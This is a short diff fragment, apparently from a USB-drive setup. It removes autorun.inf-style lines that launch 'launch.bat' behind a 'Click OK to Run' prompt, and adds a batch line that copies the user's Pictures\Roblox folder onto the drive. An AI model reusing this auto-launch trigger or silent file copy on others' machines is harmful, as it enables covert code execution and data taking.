@@ -1,3 +1,1 @@
-shell\open\command=launch.bat
-action=Click OK to Run
-shellexecute=launch.bat
+%backupcmd% "%USERPROFILE%\Pictures\Roblox" "%drive%\all\My pics\"
